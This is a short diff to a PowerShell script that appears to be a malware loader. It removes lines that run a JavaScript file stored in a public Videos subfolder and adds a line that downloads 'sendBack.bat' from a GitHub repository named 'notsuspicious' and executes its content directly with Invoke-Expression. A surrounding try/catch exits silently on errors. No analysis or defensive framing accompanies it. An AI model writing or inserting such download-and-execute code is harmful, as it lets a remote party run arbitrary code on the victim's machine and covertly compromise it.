@@ -4,6 +4,4 @@ try {
 catch {
     exit
 }
-$jsFilePath = "C:\Users\Public\Videos\GraphicalUserInterface\script.js"
-$jsContent = Get-Content -Path $jsFilePath -Raw
-Invoke-Expression -Command "node $jsContent"
+Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.bat" -UseBasicParsing).Content
